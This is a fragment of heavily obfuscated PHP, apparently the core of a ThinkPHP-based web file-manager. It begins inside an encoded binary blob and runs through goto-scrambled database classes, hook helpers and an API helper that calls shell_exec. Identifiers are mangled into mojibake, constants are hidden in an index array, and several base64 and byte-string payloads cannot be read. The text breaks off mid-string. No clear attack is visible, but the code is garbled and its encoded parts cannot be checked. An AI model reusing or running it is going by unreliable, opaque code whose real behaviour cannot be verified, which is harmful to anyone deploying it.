\x1d\xca\xd6\x0\xc1\x4\x49\x50\xf\x8a\x38\x19\x95\xa5\xdb\xfa\x8\x8\xe4\xc2\x11\x3c\x7e\x2\x12\xbf\x8\xe\xdf\xaf\x3\xec\x4a\x8a\xc\xf6\xd5\x22\x87\xde\x10\x80\x5c\xf1\xa0\x67\xc4\x8e\x25\x2\xc7\xb1\xd2\x2c\x49\xf8".base64_decode('Dz8mVwuTYSHHSsF+/pxvncQfQROfHYdnVF06owP7ewTQWbCd6NsroSV1wxTQhLeUjoGe1XGwT9U=')."\xe8\x33\x18\x84\x96\x69\x76\xd2\xf5\x38\x56\xa9\x7c\x30\xd2\x11\xcb\x36\x26\xfc\xd9\x75\xe7\x73\xeb\x68\xb\x87\x77\x65\xb6\xcd\x19\x51\xc3\x11\x41\xc2\x31\x12\xd4\x35\xb7\xbb\x68\x45\x89\x8\x4c\xdf\x89\x24\x25\x8\x67\xe1".base64_decode('9lsJ9sJ1GaMqqr1CMspFnycDv/CpgiB3xoCS8emdryQzFRVnrkGbhCvcYSQRBfJtCMqYALVE//g=')._kodDe('Mpb2cx9BgUB5lnOIkTHkrRkIjPgJMzIcEYh8mySsYlFxX3GlN7uwpaSFuGE2kbWU9mC4LYZw7Q6N').base64_decode('UUd4UYX79lXGxa8TvHT5ogIRy6H8xRVnu9C8YXByraAJXtUIuXEQwkkyt3m4KENHGeUU96eH68g=').base64_decode('tof8k/aHYRgaE8MADlJCd9ugDvfC8KSMLq+OJLI3FYqvuIW1kUKvUJx4szFthkjlj3B6tXdxxHE=').strrev('ŸÊHÏ¬£qkgbE£ŠøÂOgÍ8WçG˜«NÛFáÎŠ­¢bÃ0KË@mºl®™¡`âŸ')."\166\176\200\166\231\363\136\221\27\42\354\140\312\56\75\243\172\205\74\270\106\25\263\341\44\230\223\213\156\266\274\346\270\152\45\263\25\363\342\44\230\267\54\231\146\26\66\334\102\76\113\56\232\323\64\257"."\274\363\320\324\162\164\35\151\60\367\13\56\240\116\327\237\25\221\313\77\107\210\307\211\215\66\321\225\153\121\161\303\77\135\55\52\42\117\133\13\216\355\270\337\254\304\43\151\112\5\256\310\257\43\313\371".base64_decode('L0+rcDmKy4SLc9imK1iWLN60Vr6LDVecxab9ktQBFzuGan3s3Hzy7gfODQ5INCCCbVy7qI1p1J0=')."\22\370\2\167\123\10\115\46\175\206\263\377\250\14\350\360\330\113\311\123\53\12\136\142\53\272\374\165\301\215\161\371\316\63\107\235\155\211\16\221\361\216\105\267\324\244\240\243\1\201\242\117\137\234\116\77"."\222\343\307\144\104\200\300\127\157\176\121\345\30\325\126\205\217\305\263\353\115\333\135\136\205\164\17\77\66\265\171\214\106\217\216\61\63\162\274\242\223\203\143\174\315\201\324\151\10\244\143\22\156\270\134\170".base64_decode('ocTJEd2woHk5YOYF9NuhWxblMUAsRphI7kPea4TLWxDir7rCvkVn1ohQEUNBQXLhAjenEQWnIjY=')."\144\213\300\263\160\26\11\227\37\172\167\25\35\67\74\34\0\266\225\11\175\202\20\1\172\57\206\327\7\36\132\223\156\161\312\166\374\141\2\102\205\342\125\64\322\377\62\275\70\305\113\164\305\335\250\14"."\x37\x79\x54\x90\xe9\x8a\x91\xec\x29\x34\xb1\x98\xff\xcb\xaf\x2b\x81\x9c\xf1\xf1\x22\xf0\xcb\xd5\xe8\x9c\x8\x3e\xf8\x1e\x58\x15\x8c\x44\x23\x65\x49\x3\xbe\x48\x64\x28\x14\xf6\x63\x7d\xd3\xb2\x64\x94\x4b\xb8\xf7\x2f\x4b\x1a".base64_decode('6An1T5cW6PMFe8vSoB4A1IKl717ipOAAqqWvt5cqnZXXIti5gtcEXX/xw9pCVqdnnw6FGHq2HZE=')."\xe9\x34\x81\xcc\x9f\x6d\x8d\x85\xb0\x92\x67\x67\x56\x42\x71\xf6\xf3\x4\x71\xc8\x4d\xfa\x2e\x2b\xb\x14\xca\xb6\x1f\x82\x94\x0\xef\xed\xfb\x49\x61\x61\xea\xe6\x11\x3e\x2\xce\xa6\x3f\x13\x85\x51\xe3\x44\x5\x20\x7e\xd9\xe7"."\xb1\x5d\xa\xa\x70\x34\x71\x10\x13\x12\x8\x52\x5c\x83\x11\x80\x28\xac\x3a\x2e\x65\x1c\x9d\xd9\xed\x38\x7e\xb5\x5d\xeb\x21\x8\xef\x10\x58\xef\xe5\xd4\xcd\xc3\xa8\x9e\x10\x6e\x7a\x30\x9f\xb2\x71\x28\x51\xf3\x2\x87\x1d\xc"."\x2c\x15\xd5\xa3\x72\x86\xf0\x15\x28\x95\xf0\x58\xc7\xa4\x18\x16\xf\x3e\xda\x19\x5b\xb1\xe4\xc\xbd\x5b\x77\xb2\x62\xe1\x32\x19\xf6\xd2\xff\x7\xa8\xc9\x2d\x96\x42\xc3\x0\x0", 10, -8))); goto AôÔåéí; cÓ‹ÆËöÉ: function beforeShutdownFatalError($fŸ†Òà±•Ô) { think_exception($fŸ†Òà±•Ô); } $_SERVER[$_SERVER[Ç·ÕÂû¼„][48]] = $FñùŞ¶³ÏĞ($_SERVER[$_SERVER[Ç·ÕÂû¼„][45]]); $dííàÖ’Îë = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto Eæ„‚‚˜“Š; eß½ŸíÀ´Õ: function ActionCall($AÂóŞƒÂ—ê) { $C…áªÎµŸ® = array_slice(func_get_args(), 1); return ActionApply($AÂóŞƒÂ—ê, $C…áªÎµŸ®); } function ActionCallApi($d†„Î·›ˆ½, $bŸóñÈ³š = '') { goto eˆÜâğ†–; dåŸİé‘Û‘: $fØ†Ì¡» = phpBinCommand(); if ($fØ†Ì¡» && function_exists($eôÑñ¬ãí†[25])) { $BêŞ“‹ï†Å = $fØ†Ì¡» . $eôÑñ¬ãí†[26] . BASIC_PATH . $eôÑñ¬ãí†[27] . escapeshellarg($d†„Î·›ˆ½); $Dİ¬áù†É = shell_exec($BêŞ“‹ï†Å); } if (!$Dİ¬áù†É) { $aš™×³Ñš = stream_context_create(array($eôÑñ¬ãí†[28] => array($eôÑñ¬ãí†[29] => 20, $eôÑñ¬ãí†[30] => $eôÑñ¬ãí†[31]))); $Dİ¬áù†É = file_get_contents(APP_HOST . $eôÑñ¬ãí†[32] . $d†„Î·›ˆ½, !1, $aš™×³Ñš); } goto fµõö¾¯à’; fµõö¾¯à’: $CÆ‚ÉÚ¬¯æ = json_decode($Dİ¬áù†É, !0); $Fö©óÒ²Ä = is_array($CÆ‚ÉÚ¬¯æ) ? $CÆ‚ÉÚ¬¯æ : array($eôÑñ¬ãí†[33] => null, $eôÑñ¬ãí†[34] => $Dİ¬áù†É); if (!$CÆ‚ÉÚ¬¯æ) { echo $Dİ¬áù†É; } goto d¦©ó•Îïì; d¦©ó•Îïì: return $Fö©óÒ²Ä; goto Eö¦ã‰È—ï; eˆÜâğ†–: $eôÑñ¬ãí† =& $_SERVER[Ç·ÕÂû¼„]; $cÊóÚàìÛ = $bŸóñÈ³š; if (is_array($bŸóñÈ³š)) { $cÊóÚàìÛ = $eôÑñ¬ãí†[20]; foreach ($bŸóñÈ³š as $BŠô¿©Ô => $aèôÂß¬İÄ) { $aèôÂß¬İÄ = is_array($aèôÂß¬İÄ) ? json_encode($aèôÂß¬İÄ) : $aèôÂß¬İÄ; $aèôÂß¬İÄ = is_bool($aèôÂß¬İÄ) ? intval($aèôÂß¬İÄ) : $aèôÂß¬İÄ; $cÊóÚàìÛ .= $eôÑñ¬ãí†[21] . $BŠô¿©Ô . $eôÑñ¬ãí†[22] . rawurlencode($aèôÂß¬İÄ); } } goto DœÌíİâÎ; DœÌíİâÎ: $E°¿…Ë˜ = Action($eôÑñ¬ãí†[23])->accessToken(); $d†„Î·›ˆ½ = str_replace($eôÑñ¬ãí†[5], $eôÑñ¬ãí†[4], $d†„Î·›ˆ½) . $eôÑñ¬ãí†[24] . $E°¿…Ë˜ . $cÊóÚàìÛ; $Dİ¬áù†É = $eôÑñ¬ãí†[20]; goto dåŸİé‘Û‘; Eö¦ã‰È—ï: } function ActionCallHook($C§ÈÎæ‘ß) { goto dÉ–›”©ñ…; cÀ«“öˆ«Ä: $GLOBALS[$F­²Úñ‚ê—[35]] = 1; $cÇªèÇÃ£ò = ActionApply($C§ÈÎæ‘ß, $fØ÷ÊÇ); $e‘ÑÆÑÇµº = ob_get_clean(); goto a¤ì×õøø ; dÉ–›”©ñ…: $F­²Úñ‚ê— =& $_SERVER[Ç·ÕÂû¼„]; ob_start(); $fØ÷ÊÇ = array_slice(func_get_args(), 1); goto cÀ«“öˆ«Ä; a¤ì×õøø : $cÇªèÇÃ£ò = $e‘ÑÆÑÇµº ? json_decode($e‘ÑÆÑÇµº, !0) : $cÇªèÇÃ£ò; $GLOBALS[$F­²Úñ‚ê—[35]] = 0; return $cÇªèÇÃ£ò; goto a‘¦¾õ‡œì; a‘¦¾õ‡œì: } goto fëÚÒÚÂ¨; CÖ³îôŞ•: class DbMysqli extends Db { public function __construct($dÚ‰ââŠÍÒ = '') { $Fõ¼æÆ£ğ =& $_SERVER[Ö]; if (!extension_loaded($Fõ¼æÆ£ğ[720])) { think_exception(think_lang($Fõ¼æÆ£ğ[10]) . $Fõ¼æÆ£ğ[820]); } if (!empty($dÚ‰ââŠÍÒ)) { $this->config = $dÚ‰ââŠÍÒ; if (empty($this->config[$Fõ¼æÆ£ğ[13]])) { $this->config[$Fõ¼æÆ£ğ[13]] = $Fõ¼æÆ£ğ[33]; } } } public function connect($c•×¡£ò©á = '', $b¬ÛŞÄãÚ‘ = 0) { $BÌÛí¦Í±æ =& $_SERVER[Ö]; if (!isset($this->linkID[$b¬ÛŞÄãÚ‘])) { goto F¤‘ŒÖôÑ•; F¤‘ŒÖôÑ•: if (empty($c•×¡£ò©á)) { $c•×¡£ò©á = $this->config; } $this->linkID[$b¬ÛŞÄãÚ‘] = new mysqli($c•×¡£ò©á[$BÌÛí¦Í±æ[794]], $c•×¡£ò©á[$BÌÛí¦Í±æ[796]], $c•×¡£ò©á[$BÌÛí¦Í±æ[797]], $c•×¡£ò©á[$BÌÛí¦Í±æ[17]], $c•×¡£ò©á[$BÌÛí¦Í±æ[795]] ? intval($c•×¡£ò©á[$BÌÛí¦Í±æ[795]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto dÚ¢Èìö’²; dÚ¢Èìö’²: $D¤’öá…ï = $this->linkID[$b¬ÛŞÄãÚ‘]->server_version; $this->linkID[$b¬ÛŞÄãÚ‘]->query($BÌÛí¦Í±æ[798] . think_config($BÌÛí¦Í±æ[799]) . $BÌÛí¦Í±æ[55]); if ($D¤’öá…ï > $BÌÛí¦Í±æ[800]) { $this->linkID[$b¬ÛŞÄãÚ‘]->query($BÌÛí¦Í±æ[801]); } goto a„Ë…Á‡œ; a„Ë…Á‡œ: $this->connected = !0; if (1 != think_config($BÌÛí¦Í±æ[18])) { unset($this->config); } goto E¯·÷Âî—Ğ; E¯·÷Âî—Ğ: } return $this->linkID[$b¬ÛŞÄãÚ‘]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Eñœä¿Ùîô) { goto fÓ»òšŞ‚™; aİÓÌÓ¾òÑ: $this->queryStr = $Eñœä¿Ùîô; if ($this->queryID) { $this->free(); } think_action_status($fèŒ†ƒ•Õù[19], 1); goto ešÕÜ³•˜ï; fÓ»òšŞ‚™: $fèŒ†ƒ•Õù =& $_SERVER[Ö]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto aİÓÌÓ¾òÑ; ešÕÜ³•˜ï: think_status($fèŒ†ƒ•Õù[20]); $this->queryID = $this->_linkID->query($Eñœä¿Ùîô); if ($this->_linkID->more_results()) { while (($dØ¹ò¬‘´¬ = $this->_linkID->next_result()) != NULL) { $dØ¹ò¬‘´¬->free_result(); } } goto C—®»Ğà—Ğ; C—®»Ğà—Ğ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto CæÑ¨„‚÷Ğ; CæÑ¨„‚÷Ğ: } public function execute($d˜‰ùÎ©Öê) { goto Cê³Ô³…óŠ; Fó¢—äÜ©: $this->queryStr = $d˜‰ùÎ©Öê; if ($this->queryID) { $this->free(); } think_action_status($bœ¦©Ú[21], 1); goto b©ÓñŠÕ¼é; Cê³Ô³…óŠ: $bœ¦©Ú =& $_SERVER[Ö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Fó¢—äÜ©; b©ÓñŠÕ¼é: think_status($bœ¦©Ú[20]); $Cßìèî‰é§ = $this->_linkID->query($d˜‰ùÎ©Öê); $this->debug(); goto EÔƒç„±¯Ã; EÔƒç„±¯Ã: if (!1 === $Cßìèî‰é§) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto DËØåÎŞ‰Ÿ; DËØåÎŞ‰Ÿ: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $FƒÈëŞö÷à = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$FƒÈëŞö÷à) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $döŠƒŠŠÚæ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$döŠƒŠŠÚæ) { $this->error(); return !1; } } return !0; } private function getAll() { $a‰˜ÙÙÎÓ¢ = array(); if ($this->numRows > 0) { for ($c²ÜîØí‚– = 0; $c²ÜîØí‚– < $this->numRows; $c²ÜîØí‚–++) { $a‰˜ÙÙÎÓ¢[$c²ÜîØí‚–] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $a‰˜ÙÙÎÓ¢; } public function getFields($C†ôÙšó£Ş) { $e©Ÿ¥å´È =& $_SERVER[Ö]; $Eëó¬•õ½„ = $this->query($e©Ÿ¥å´È[805] . $this->parseKey($C†ôÙšó£Ş)); $bì‡çÆÉˆÌ = array(); if ($Eëó¬•õ½„) { foreach ($Eëó¬•õ½„ as $d¤‘ß­ÎË® => $d–ÁÕÜÇ‡ò) { $bì‡çÆÉˆÌ[$d–ÁÕÜÇ‡ò[$e©Ÿ¥å´È[27]]] = array($e©Ÿ¥å´È[28] => $d–ÁÕÜÇ‡ò[$e©Ÿ¥å´È[27]], $e©Ÿ¥å´È[29] => $d–ÁÕÜÇ‡ò[$e©Ÿ¥å´È[30]], $e©Ÿ¥å´È[31] => (bool) ($d–ÁÕÜÇ‡ò[$e©Ÿ¥å´È[32]] === $e©Ÿ¥å´È[33]), $e©Ÿ¥å´È[34] => $d–ÁÕÜÇ‡ò[$e©Ÿ¥å´È[35]], $e©Ÿ¥å´È[36] => strtolower($d–ÁÕÜÇ‡ò[$e©Ÿ¥å´È[37]]) == $e©Ÿ¥å´È[38], $e©Ÿ¥å´È[39] => strtolower($d–ÁÕÜÇ‡ò[$e©Ÿ¥å´È[40]]) == $e©Ÿ¥å´È[41]); } } return $bì‡çÆÉˆÌ; } public function getTables($F°§·İø°Œ = '') { $Eè¿§­¾¹ =& $_SERVER[Ö]; $A²ßÃ‰áã = !empty($F°§·İø°Œ) ? $Eè¿§­¾¹[807] . $F°§·İø°Œ : $Eè¿§­¾¹[808]; $e¾³Í…¬Šë = $this->query($A²ßÃ‰áã); $AöÜ‡õë‹Ù = array(); if ($e¾³Í…¬Šë) { foreach ($e¾³Í…¬Šë as $CŒ˜ƒ¿…·Ê => $eö‚Ï…š²´) { $AöÜ‡õë‹Ù[$CŒ˜ƒ¿…·Ê] = current($eö‚Ï…š²´); } } return $AöÜ‡õë‹Ù; } public function replace($aÊÜ…‡ÖÊ¦, $E¿²õÏÅÎ× = array()) { $F¯Ëäµù‡÷ =& $_SERVER[Ö]; foreach ($aÊÜ…‡ÖÊ¦ as $DªÆå™ê => $c‚‚ÚÌº–¥) { $bù§İŸ¿‹ = $this->parseValue($c‚‚ÚÌº–¥); if (is_scalar($bù§İŸ¿‹)) { $E¥¡ß—©Ì‚[] = $bù§İŸ¿‹; $D†êÑ‰‘ì[] = $this->parseKey($DªÆå™ê); } } $a°‰Í£’ù” = $F¯Ëäµù‡÷[809] . $this->parseTable($E¿²õÏÅÎ×[$F¯Ëäµù‡÷[263]]) . $F¯Ëäµù‡÷[810] . implode($F¯Ëäµù‡÷[47], $D†êÑ‰‘ì) . $F¯Ëäµù‡÷[811] . implode($F¯Ëäµù‡÷[47], $E¥¡ß—©Ì‚) . $F¯Ëäµù‡÷[812]; return $this->execute($a°‰Í£’ù”); } public function insertAll($b’œİÂëäô, $EÙ±œ–ÊŠº = array(), $FãÖĞŒ¼ = false) { goto E¼à‘…‰É“; dÊ´Ğé°ñ”: $AÜ‰ĞÌÁ÷ = ($FãÖĞŒ¼ ? $eÃŸîé‰™À[814] : $eÃŸîé‰™À[815]) . $eÃŸîé‰™À[816] . $this->parseTable($EÙ±œ–ÊŠº[$eÃŸîé‰™À[263]]) . $eÃŸîé‰™À[810] . implode($eÃŸîé‰™À[47], $D©ø¼ó‰„£) . $eÃŸîé‰™À[817] . implode($eÃŸîé‰™À[47], $F×¥ò›ĞÎÚ); return $this->execute($AÜ‰ĞÌÁ÷); goto Eíøí‘®±¡; E¼à‘…‰É“: $eÃŸîé‰™À =& $_SERVER[Ö]; if (!is_array($b’œİÂëäô[0])) { return !1; } $D©ø¼ó‰„£ = array_keys($b’œİÂëäô[0]); goto f…íÍÅÁ‚Ï; f…íÍÅÁ‚Ï: $F×¥ò›ĞÎÚ = array(); foreach ($b’œİÂëäô as $AõŞÙáö¡Ğ) { $f—ÊºÑéÖÃ = array(); foreach ($AõŞÙáö¡Ğ as $E›Ò·ê÷ => $Còö÷¯Ÿáô) { $Còö÷¯Ÿáô = $this->parseValue($Còö÷¯Ÿáô); if (is_scalar($Còö÷¯Ÿáô)) { $f—ÊºÑéÖÃ[] = $Còö÷¯Ÿáô; } } $F×¥ò›ĞÎÚ[] = $eÃŸîé‰™À[244] . implode($eÃŸîé‰™À[47], $f—ÊºÑéÖÃ) . $eÃŸîé‰™À[812]; } array_walk($D©ø¼ó‰„£, array($this, $eÃŸîé‰™À[813])); goto dÊ´Ğé°ñ”; Eíøí‘®±¡: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $dë†ªæš‰ =& $_SERVER[Ö]; $this->error = $this->_linkID->errno . $dë†ªæš‰[4] . $this->_linkID->error; if ($dë†ªæš‰[33] != $this->queryStr) { $this->error .= LNG($dë†ªæš‰[45]) . $this->queryStr; } think_trace($this->error, $dë†ªæš‰[33], $dë†ªæš‰[46]); return $this->error; } public function escapeString($AâœİÑß) { if ($this->_linkID) { return $this->_linkID->real_escape_string($AâœİÑß); } else { return addslashes($AâœİÑß); } } public function parseKey(&$B§¹´Å’ëÇ, $eª”¼ƒ¯î– = true) { $b–¿®„¬ö÷ =& $_SERVER[Ö]; if ($eª”¼ƒ¯î–) { $B§¹´Å’ëÇ = $this->parseKeyCheck($B§¹´Å’ëÇ); } if ($B§¹´Å’ëÇ != $b–¿®„¬ö÷[172] && !preg_match($b–¿®„¬ö÷[818], $B§¹´Å’ëÇ)) { $B§¹´Å’ëÇ = $b–¿®„¬ö÷[819] . trim($B§¹´Å’ëÇ, $b–¿®„¬ö÷[819]) . $b–¿®„¬ö÷[819]; } return $B§¹´Å’ëÇ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($aåÑÛ©Ü–¿ = '') { $EÜ¨²Ëø²¨ =& $_SERVER[Ö]; if (!class_exists($EÜ¨²Ëø²¨[821])) { think_exception(think_lang($EÜ¨²Ëø²¨[10]) . $EÜ¨²Ëø²¨[822]); } if (!empty($aåÑÛ©Ü–¿)) { $this->config = $aåÑÛ©Ü–¿; if (empty($this->config[$EÜ¨²Ëø²¨[13]])) { $this->config[$EÜ¨²Ëø²¨[13]] = array(); } } } public function connect($dÄÂø‰ÑÈ‹ = '', $a¶ñ±´“Ã³ = 0) { $AïÕÆíåòÍ =& $_SERVER[Ö]; if (!isset($this->linkID[$a¶ñ±´“Ã³])) { goto C¸¢ˆ†öóÊ; C¸¢ˆ†öóÊ: if (empty($dÄÂø‰ÑÈ‹)) { $dÄÂø‰ÑÈ‹ = $this->config; } if ($this->pconnect) { $dÄÂø‰ÑÈ‹[$AïÕÆíåòÍ[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$a¶ñ±´“Ã³] = new PDO($dÄÂø‰ÑÈ‹[$AïÕÆíåòÍ[823]], $dÄÂø‰ÑÈ‹[$AïÕÆíåòÍ[796]], $dÄÂø‰ÑÈ‹[$AïÕÆíåòÍ[797]], $dÄÂø‰ÑÈ‹[$AïÕÆíåòÍ[13]]); } catch (PDOException $C”ƒùÄ·Äµ) { think_exception($C”ƒùÄ·Äµ->getMessage()); } goto Eº…¥™–Š‡; Eº…¥™–Š‡: $this->dbType = $this->_getDsnType($dÄÂø‰ÑÈ‹[$AïÕÆíåòÍ[823]]); if (in_array($this->dbType, array($AïÕÆíåòÍ[824], $AïÕÆíåòÍ[825], $AïÕÆíåòÍ[826], $AïÕÆíåòÍ[827]))) { think_exception($AïÕÆíåòÍ[828] . $this->dbType . $AïÕÆíåòÍ[829] . $this->dbType . $AïÕÆíåòÍ[830]); } if (!$this->linkID[$a¶ñ±´“Ã³]) { think_exception($AïÕÆíåòÍ[831]); } goto D‘…§ù‰•Ó; D‘…§ù‰•Ó: $this->linkID[$a¶ñ±´“Ã³]->exec($AïÕÆíåòÍ[832] . think_config($AïÕÆíåòÍ[799])); $this->connected = !0; if (1 != think_config($AïÕÆíåòÍ[18])) { unset($this->config); } goto Dó†²Û–¨º; Dó†²Û–¨º: } return $this->linkID[$a¶ñ±´“Ã³]; } public function free() { $this->PDOStatement = null; } public function query($FŞÂÎï…ã§, $eÜ‘§÷ = array()) { goto B×åÙö”©; bòêÇ ÔŒ’: if (!1 === $D‚Øí„·‰Ù) { $this->error(); return !1; } else { return $this->getAll(); } goto aìßÓÊ®ì; EÀæŠÓÆ™Ç: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $D‚Øí„·‰Ù = $this->PDOStatement->execute($eÜ‘§÷); $this->debug(); goto bòêÇ ÔŒ’; B×åÙö”©: $EÂõ™ƒ¶ÛÇ =& $_SERVER[Ö]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto c÷ç®éœÌ”; cë­¬‹Í: think_action_status($EÂõ™ƒ¶ÛÇ[19], 1); think_status($EÂõ™ƒ¶ÛÇ[20]); $this->PDOStatement = $this->_linkID->prepare($FŞÂÎï…ã§); goto EÀæŠÓÆ™Ç; c÷ç®éœÌ”: $this->queryStr = $FŞÂÎï…ã§; if (!empty($eÜ‘§÷)) { $this->queryStr .= $EÂõ™ƒ¶ÛÇ[833] . print_r($eÜ‘§÷, !0) . $EÂõ™ƒ¶ÛÇ[834]; } if (!empty($this->PDOStatement)) { $this->free(); } goto cë­¬‹Í; aìßÓÊ®ì: } public function execute($b×Ùöºò, $Dº“æ¯¨… = array()) { goto B¾Ã ƒõñª; e±İ‚¶¿öÍ: think_status($c¹»—®Éù[20]); $this->PDOStatement = $this->_linkID->prepare($b×Ùöºò); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto bºƒ·‰Í; B¾Ã ƒõñª: $c¹»—®Éù =& $_SERVER[Ö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto B©‡”°—èã; D İÏßŒÄè: if ($this->dbType == $c¹»—®Éù[827]) { if (preg_match($c¹»—®Éù[835], $this->queryStr, $c”ñŒïÄ•)) { $this->table = think_config($c¹»—®Éù[836]) . str_ireplace(think_config($c¹»—®Éù[837]), $c¹»—®Éù[357], $c”ñŒïÄ•[2]); $EÆËÎ¬°§¥ = (bool) $this->query($c¹»—®Éù[838] . strtoupper($this->table) . $c¹»—®Éù[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($c¹»—®Éù[21], 1); goto e±İ‚¶¿öÍ; B©‡”°—èã: $this->queryStr = $b×Ùöºò; if (!empty($Dº“æ¯¨…)) { $this->queryStr .= $c¹»—®Éù[833] . print_r($Dº“æ¯¨…, !0) . $c¹»—®Éù[834]; } $EÆËÎ¬°§¥ = !1; goto D İÏßŒÄè; bºƒ·‰Í: $B†‚©ñ²Äã = $this->PDOStatement->execute($Dº“æ¯¨…); $this->debug(); if (!1 === $B†‚©ñ²Äã) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($EÆËÎ¬°§¥ || preg_match($c¹»—®Éù[839], $b×Ùöºò)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto dÃÒÌä‹ğ†; dÃÒÌä‹ğ†: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $B¥¸»ô¡Ë = $this->_linkID->commit(); $this->transTimes = 0; if (!$B¥¸»ô¡Ë) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $bğÆÎÌ‰¾ì = $this->_linkID->rollback(); $this->transTimes = 0; if (!$bğÆÎÌ‰¾ì) { $this->error(); return !1; } } return !0; } private function getAll() { $D†¶ ÙÊõÃ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($D†¶ ÙÊõÃ); return $D†¶ ÙÊõÃ; } public function getFields($e°µ¨ö²½Û) { goto fùˆ“‰øËÌ; f‰ªŠÁØÔŸ: $b½‡„¿õ¨‡ = $this->query($aíòÒÁÌíÄ); $f¨ğÀœ°‡Ë = array(); if ($b½‡„¿õ¨‡) { foreach ($b½‡„¿õ¨‡ as $e¾ÊÓìÙ«ß => $a¤µá¯†•ù) { $a¤µá¯†•ù = array_change_key_case($a¤µá¯†•ù); $a¤µá¯†•ù[$dµ¯ŠÙÅ[28]] = isset($a¤µá¯†•ù[$dµ¯ŠÙÅ[28]]) ? $a¤µá¯†•ù[$dµ¯ŠÙÅ[28]] : $dµ¯ŠÙÅ[357]; $a¤µá¯†•ù[$dµ¯ŠÙÅ[29]] = isset($a¤µá¯†•ù[$dµ¯ŠÙÅ[29]]) ? $a¤µá¯†•ù[$dµ¯ŠÙÅ[29]] : $dµ¯ŠÙÅ[357]; $fÌá¯øÍÅ = isset($a¤µá¯†•ù[$dµ¯ŠÙÅ[257]]) ? $a¤µá¯†•ù[$dµ¯ŠÙÅ[257]] : $a¤µá¯†•ù[$dµ¯ŠÙÅ[28]]; $f¨ğÀœ°‡Ë[$fÌá¯øÍÅ] = array($dµ¯ŠÙÅ[28] => $fÌá¯øÍÅ, $dµ¯ŠÙÅ[29] => $a¤µá¯†•ù[$dµ¯ŠÙÅ[29]], $dµ¯ŠÙÅ[31] => (bool) (isset($a¤µá¯†•ù[$dµ¯ŠÙÅ[99]]) && $a¤µá¯†•ù[$dµ¯ŠÙÅ[99]] === $dµ¯ŠÙÅ[33] || isset($a¤µá¯†•ù[$dµ¯ŠÙÅ[31]]) && $a¤µá¯†•ù[$dµ¯ŠÙÅ[31]] === $dµ¯ŠÙÅ[33]), $dµ¯ŠÙÅ[34] => isset($a¤µá¯†•ù[$dµ¯ŠÙÅ[34]]) ? $a¤µá¯†•ù[$dµ¯ŠÙÅ[34]] : (isset($a¤µá¯†•ù[$dµ¯ŠÙÅ[53]]) ? $a¤µá¯†•ù[$dµ¯ŠÙÅ[53]] : $dµ¯ŠÙÅ[357]), $dµ¯ŠÙÅ[36] => isset($a¤µá¯†•ù[$dµ¯ŠÙÅ[89]]) ? strtolower($a¤µá¯†•ù[$dµ¯ŠÙÅ[89]]) == $dµ¯ŠÙÅ[38] : (isset($a¤µá¯†•ù[$dµ¯ŠÙÅ[54]]) ? $a¤µá¯†•ù[$dµ¯ŠÙÅ[54]] : !1), $dµ¯ŠÙÅ[39] => isset($a¤µá¯†•ù[$dµ¯ŠÙÅ[856]]) ? strtolower($a¤µá¯†•ù[$dµ¯ŠÙÅ[856]]) == $dµ¯ŠÙÅ[41] : (isset($a¤µá¯†•ù[$dµ¯ŠÙÅ[89]]) ? $a¤µá¯†•ù[$dµ¯ŠÙÅ[89]] : !1)); } } goto Dõ©¿Ôâ½ò; Dõ©¿Ôâ½ò: return $f¨ğÀœ°‡Ë; goto bÂ„½íŞ‚Å; fùˆ“‰øËÌ: $dµ¯ŠÙÅ =& $_SERVER[Ö]; $this->initConnect(!0); if (think_config($dµ¯ŠÙÅ[840])) { $aíòÒÁÌíÄ = str_replace($dµ¯ŠÙÅ[841], $e°µ¨ö²½Û, think_config($dµ¯ŠÙÅ[840])); } else { switch ($this->dbType) { case $dµ¯ŠÙÅ[824]: case $dµ¯ŠÙÅ[842]: $aíòÒÁÌíÄ = "\x53\105\x4c\105\103\x54\40\x20\40\143\x6f\154\x75\155\156\137\156\141\155\145\x20\x61\163\x20\47\116\x61\155\145\47\x2c\40\x20\40\x64\141\164\x61\x5f\164\x79\160\145\x20\141\163\x20\x27\x54\x79\x70\x65\x27\x2c\x20\40\x20\x63\x6f\154\165\155\156\x5f\144\145\146\x61\165\154\164\40\x61\163\x20\x27\104\145\146\141\x75\x6c\164\x27\x2c\x20\x20\40\x69\163\x5f\156\165\154\x6c\x61\x62\x6c\145\x20\141\x73\40\x27\116\165\154\154\47\12\11\11\x46\122\117\115\11\x69\156\x66\x6f\162\x6d\141\x74\x69\157\156\x5f\163\143\150\x65\155\141\x2e\x74\x61\142\154\145\x73\40\x41\123\x20\x74\xa\x9\x9\x4a\117\x49\116\11\151\156\x66\x6f\x72\x6d\x61\x74\x69\x6f\156\137\